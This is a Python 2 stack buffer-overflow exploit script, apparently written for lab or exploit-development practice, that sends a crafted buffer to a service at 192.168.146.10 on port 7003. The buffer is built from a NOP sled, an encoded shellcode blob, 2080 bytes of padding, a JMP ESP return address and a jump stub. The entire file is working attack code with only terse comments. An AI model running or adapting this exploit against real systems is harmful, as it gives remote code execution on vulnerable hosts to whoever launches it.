#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
   
    # Bad Chars: \x00\x3b\x45
    shellcode =  ""
    shellcode += "\xbf\xd3\x27\x42\xe1\xdb\xc6\xd9\x74\x24\xf4\x5a"
    shellcode += "\x33\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x0e\x03\xa9"
    shellcode += "\x29\xa0\x14\xb1\xde\xa6\xd7\x49\x1f\xc7\x5e\xac"
    shellcode += "\x2e\xc7\x05\xa5\x01\xf7\x4e\xeb\xad\x7c\x02\x1f"
    shellcode += "\x25\xf0\x8b\x10\x8e\xbf\xed\x1f\x0f\x93\xce\x3e"
    shellcode += "\x93\xee\x02\xe0\xaa\x20\x57\xe1\xeb\x5d\x9a\xb3"
    shellcode += "\xa4\x2a\x09\x23\xc0\x67\x92\xc8\x9a\x66\x92\x2d"
    shellcode += "\x6a\x88\xb3\xe0\xe0\xd3\x13\x03\x24\x68\x1a\x1b"
    shellcode += "\x29\x55\xd4\x90\x99\x21\xe7\x70\xd0\xca\x44\xbd"
    shellcode += "\xdc\x38\x94\xfa\xdb\xa2\xe3\xf2\x1f\x5e\xf4\xc1"
    shellcode += "\x62\x84\x71\xd1\xc5\x4f\x21\x3d\xf7\x9c\xb4\xb6"
    shellcode += "\xfb\x69\xb2\x90\x1f\x6f\x17\xab\x24\xe4\x96\x7b"
    shellcode += "\xad\xbe\xbc\x5f\xf5\x65\xdc\xc6\x53\xcb\xe1\x18"
    shellcode += "\x3c\xb4\x47\x53\xd1\xa1\xf5\x3e\xbe\x06\x34\xc0"
    shellcode += "\x3e\x01\x4f\xb3\x0c\x8e\xfb\x5b\x3d\x47\x22\x9c"
    shellcode += "\x42\x72\x92\x32\xbd\x7d\xe3\x1b\x7a\x29\xb3\x33"
    shellcode += "\xab\x52\x58\xc3\x54\x87\xcf\x93\xfa\x78\xb0\x43"
    shellcode += "\xbb\x28\x58\x89\x34\x16\x78\xb2\x9e\x3f\x13\x49"
    shellcode += "\x49\x80\x4c\x26\x1b\x68\x8f\xc8\x0a\x35\x06\x2e"
    shellcode += "\x46\xd5\x4e\xf9\xff\x4c\xcb\x71\x61\x90\xc1\xfc"
    shellcode += "\xa1\x1a\xe6\x01\x6f\xeb\x83\x11\x18\x1b\xde\x4b"
    shellcode += "\x8f\x24\xf4\xe3\x53\xb6\x93\xf3\x1a\xab\x0b\xa4"
    shellcode += "\x4b\x1d\x42\x20\x66\x04\xfc\x56\x7b\xd0\xc7\xd2"
    shellcode += "\xa0\x21\xc9\xdb\x25\x1d\xed\xcb\xf3\x9e\xa9\xbf"
    shellcode += "\xab\xc8\x67\x69\x0a\xa3\xc9\xc3\xc4\x18\x80\x83"
    shellcode += "\x91\x52\x13\xd5\x9d\xbe\xe5\x39\x2f\x17\xb0\x46"
    shellcode += "\x80\xff\x34\x3f\xfc\x9f\xbb\xea\x44\xbf\x59\x3e"
    shellcode += "\xb1\x28\xc4\xab\x78\x35\xf7\x06\xbe\x40\x74\xa2"
    shellcode += "\x3f\xb7\x64\xc7\x3a\xf3\x22\x34\x37\x6c\xc7\x3a"
    shellcode += "\xe4\x8d\xc2"


    # msfOffset/Padding(A-\x41) + EIP(B-\x42) + ESP(C-\x43)
    padding = "D"*2080 + "B"*4 + "C"*13

    # msfOffset = "A"*2080
    # EIP is replaced with a Return Address, in this case JMP ESP that points to the ESP Register: 0x14 80 11 1E in Endian Format. Found with Mona.
    eip = "\x1E\x11\x80\x14"
    esp = "\xff\xe2\x90\x90\x90\x90\x90\x90"
    # no offset for this app - offset is the space between EIP and ESP
    # offset = "D" * 4
    # nops required for the encoder stub
    nops = "\x90"*15

    # print "msfOffset - badChars
    padding1 = "A" * (2080 - len(shellcode) - len(nops))

    buffer = nops + shellcode + padding1 + eip + esp
    # buffer = padding
    
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.146.10", 7003))
    s.send(buffer)
    
    s.close()
    print "\nDone!"

except IOError as msg:
    print msg
    print "\nCould not connect!"
